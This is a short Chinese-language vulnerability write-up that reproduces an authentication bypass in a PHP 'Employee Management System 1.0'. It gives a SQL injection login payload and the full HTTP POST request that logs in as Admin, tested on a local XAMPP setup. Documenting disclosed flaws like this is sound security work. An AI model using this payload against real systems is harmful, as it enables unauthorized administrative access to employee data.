# 员工管理系统 Employee Management System 1.0 身份验证绕过

## 漏洞描述

漏洞发现时间：2020-10-16

软件下载地址：https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip

验证环境：Windows 10 + xampp v3.2.4

参考链接：

- https://www.exploit-db.com/exploits/48882

## 漏洞复现

打开网址：

```
http://localhost:8081/Employee%20Management%20System/alogin.html
```

通过payload绕过验证：

```
anki' or 1=1#
```

发送请求：

```
POST /Employee%20Management%20System/process/aprocess.php HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/Employee%20Management%20System/alogin.html
Cookie: PHPSESSID=infdfigld4et4jndfgbn33kcsv
Upgrade-Insecure-Requests: 1

mailuid=anki%27+or+1%3D1%23&pwd=anki%27+or+1%3D1%23&login-submit=Login
```

将以Admin身份登录应用